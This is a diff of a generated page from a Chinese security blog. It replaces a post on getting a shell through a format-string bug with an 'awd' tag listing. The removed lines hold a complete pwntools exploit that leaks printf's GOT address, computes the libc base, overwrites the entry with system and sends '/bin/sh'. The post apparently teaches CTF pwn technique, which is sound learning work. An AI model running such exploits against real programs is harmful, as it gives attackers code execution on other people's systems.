@@ -22,20 +22,18 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":300,"display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
-  <meta name="description" content="前提条件一般格式化字符串没办法获取shell，但是可以借助got表来改写printf为system，再输入&#x2F;bin&#x2F;sh即可获取shell 情况一，劫持got表，把print的got表改为system123456789101112131415161718192021222324252627from pwn import *io&#x3D;process(&#x27;.&#x2F;2&#x27;)elf&#x3D;ELF(&amp;#x">
-<meta property="og:type" content="article">
+  <meta name="description" content="学习逆向贵在坚持">
+<meta property="og:type" content="website">
 <meta property="og:title" content="s0m1ng">
-<meta property="og:url" content="http://example.com/2025/09/05/PWN/pwn_attack/format_string/fmt_getshell/index.html">
+<meta property="og:url" content="http://example.com/tags/awd/index.html">
 <meta property="og:site_name" content="s0m1ng">
-<meta property="og:description" content="前提条件一般格式化字符串没办法获取shell，但是可以借助got表来改写printf为system，再输入&#x2F;bin&#x2F;sh即可获取shell 情况一，劫持got表，把print的got表改为system123456789101112131415161718192021222324252627from pwn import *io&#x3D;process(&#x27;.&#x2F;2&#x27;)elf&#x3D;ELF(&amp;#x">
+<meta property="og:description" content="学习逆向贵在坚持">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-09-04T16:16:22.847Z">
-<meta property="article:modified_time" content="2025-09-06T14:30:37.492Z">
 <meta property="article:author" content="s0m1ng">
 <meta property="article:tag" content="逆向，实战，外挂">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://example.com/2025/09/05/PWN/pwn_attack/format_string/fmt_getshell/">
+<link rel="canonical" href="http://example.com/tags/awd/">
 
 
 <script id="page-configurations">
@@ -43,12 +41,12 @@
   CONFIG.page = {
     sidebar: "",
     isHome : false,
-    isPost : true,
+    isPost : false,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title> | s0m1ng</title>
+  <title>标签: awd | s0m1ng</title>
   
 
 
@@ -174,146 +172,51 @@
         <div class="content-wrap">
           
 
-          <div class="content post posts-expand">
+          <div class="content tag">
             
 
-    
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/09/05/PWN/pwn_attack/format_string/fmt_getshell/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/profile_photo.jpg">
-      <meta itemprop="name" content="s0m1ng">
-      <meta itemprop="description" content="学习逆向贵在坚持">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="s0m1ng">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2025-09-05 00:16:22" itemprop="dateCreated datePublished" datetime="2025-09-05T00:16:22+08:00">2025-09-05</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-09-06 22:30:37" itemprop="dateModified" datetime="2025-09-06T22:30:37+08:00">2025-09-06</time>
-              </span>
-
-          
-            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span id="busuanzi_value_page_pv"></span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
   
-  <h1 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h1><p>一般格式化字符串没办法获取shell，但是可以借助got表来改写printf为system，再输入/bin/sh即可获取shell</p>
-<h2 id="情况一，劫持got表，把print的got表改为system"><a href="#情况一，劫持got表，把print的got表改为system" class="headerlink" title="情况一，劫持got表，把print的got表改为system"></a>情况一，劫持got表，把print的got表改为system</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io=process(&#x27;./2&#x27;)</span><br><span class="line">elf=ELF(&#x27;./2&#x27;)</span><br><span class="line">libc=elf.libc</span><br><span class="line">adr_print_got=0x403308</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">payload = b&quot;%7$saaaa&quot; + p64(adr_print_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">ture_adr_print=u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;[1]:&#x27;,hex(ture_adr_print))</span><br><span class="line"></span><br><span class="line">libc_base=ture_adr_print-libc.sym[&#x27;printf&#x27;]</span><br><span class="line">print(&#x27;[2]:&#x27;,hex(libc_base))</span><br><span class="line">adr_system=libc_base+libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(6,&#123;adr_print_got:adr_system&#125;)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(&#x27;/bin/sh\x00&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-    
-    
-    
-        <div class="reward-container">
-  <div>您的支持将鼓励我继续创作!</div>
-  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
-    打赏
-  </button>
-  <div id="qr" style="display: none;">
-      
-      <div style="display: inline-block;">
-        <img src="/images/reward.jpg" alt="s0m1ng 微信支付">
-        <p>微信支付</p>
+  <div class="post-block">
+    <div class="posts-collapse">
+      <div class="collection-title">
+        <h2 class="collection-header">awd
+          <small>标签</small>
+        </h2>
       </div>
 
-  </div>
-</div>
+      
+    <div class="collection-year">
+      <span class="collection-header">2026</span>
+    </div>
 
-        
+  <article itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
 
-<div>
-<ul class="post-copyright">
-  <li class="post-copyright-author">
-    <strong>本文作者： </strong>s0m1ng
-  </li>
-  <li class="post-copyright-link">
-    <strong>本文链接：</strong>
-    <a href="http://example.com/2025/09/05/PWN/pwn_attack/format_string/fmt_getshell/" title="">http://example.com/2025/09/05/PWN/pwn_attack/format_string/fmt_getshell/</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
-  </li>
-</ul>
-</div>
+      <div class="post-meta">
+        <time itemprop="dateCreated"
+              datetime="2026-03-16T00:00:00+08:00"
+              content="2026-03-16">
+          03-16
+        </time>
+      </div>
 
-        
-
-  <div class="followme">
-    <p>欢迎关注我的其它发布渠道</p>
-
-    <div class="social-list">
-
-        <div class="social-item">
-          <a target="_blank" class="social-link" href="/atom.xml">
-            <span class="icon">
-              <i class="fa fa-rss"></i>
-            </span>
-
-            <span class="label">RSS</span>
+      <div class="post-title">
+          <a class="post-title-link" href="/2026/03/16/PWN/pwn_attack/AWD/AWD%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC/" itemprop="url">
+            <span itemprop="name">AWD攻击：批量自动化攻击框架</span>
           </a>
-        </div>
+      </div>
+
+    </header>
+  </article>
+
     </div>
   </div>
-
-
-      <footer class="post-footer">
-
-        
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2025/09/03/PWN/pwn_attack/format_string/w_every_addr/" rel="prev" title="">
-      <i class="fa fa-chevron-left"></i> 
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2025/10/01/REVERSE/rust%E9%80%86%E5%90%91%E9%A2%98%E5%8D%95/rust%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/" rel="next" title="rust逆向基础-rust基础语法">
-      rust逆向基础-rust基础语法 <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
-      </footer>
-    
-  </article>
   
   
+  
+
   
 
 
@@ -366,7 +269,6 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.</span> <span class="nav-text">前提条件</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%83%85%E5%86%B5%E4%B8%80%EF%BC%8C%E5%8A%AB%E6%8C%81got%E8%A1%A8%EF%BC%8C%E6%8A%8Aprint%E7%9A%84got%E8%A1%A8%E6%94%B9%E4%B8%BAsystem"><span class="nav-number">1.1.</span> <span class="nav-text">情况一，劫持got表，把print的got表改为system</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -382,17 +284,17 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">33</span>
+          <span class="site-state-item-count">34</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-count">24</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">28</span>
+        <span class="site-state-item-count">36</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
